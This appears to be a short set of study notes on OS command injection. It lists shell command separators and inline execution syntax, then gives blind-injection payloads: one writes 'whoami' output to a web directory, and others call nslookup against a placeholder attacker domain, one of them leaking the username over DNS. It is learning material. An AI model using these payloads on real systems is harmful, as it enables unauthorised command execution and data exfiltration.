## Useful characters for injection

The following command separators work on both Windows and Unix-based systems:

- `&`
- `&&`
- `|`
- `||`

The following command separators work only on Unix-based systems:

- `;`
- Newline (`0x0a` or `\n`)

On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command:

- `` ` `` injected command `` ` ``
- `$(` injected command `)`

## Bind OS injection

Redirecting output.
- `& whoami > /var/www/static/whoami.txt &`

Using OAST techniques
- `& nslookup kgji2ohoyw.web-attacker.com &`
- ``& nslookup `whoami`.kgji2ohoyw.web-attacker.com &``
- 